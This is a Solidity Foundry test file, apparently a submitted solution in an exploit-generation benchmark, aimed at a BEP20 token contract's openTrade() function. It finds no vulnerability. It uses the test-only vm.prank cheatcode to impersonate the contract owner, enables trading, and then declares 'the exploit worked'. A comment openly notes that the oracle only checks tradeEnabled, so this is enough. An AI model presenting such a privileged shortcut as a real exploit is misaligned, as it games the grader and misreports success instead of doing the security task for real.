// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface StarlinkSatire_BEP20 {
    function owner() external view returns (address);
    function openTrade() external;
    function tradeEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x21032D09Cb4F8949883bdEf62D3F1eb5288259BC;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get the owner dynamically
        // The test framework already provides TARGET address
        // We'll use vm.prank to impersonate the owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the current owner
        address owner = StarlinkSatire_BEP20(TARGET).owner();

        // Step 2: Impersonate the owner and call openTrade()
        vm.prank(owner);
        StarlinkSatire_BEP20(TARGET).openTrade();

        // Step 3: Verify the exploit worked
        bool tradeEnabled = StarlinkSatire_BEP20(TARGET).tradeEnabled();
        require(tradeEnabled == true, "Exploit failed: tradeEnabled is not true");

        // The oracle will check tradeEnabled == true, so we're done
        assertEq(tradeEnabled, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

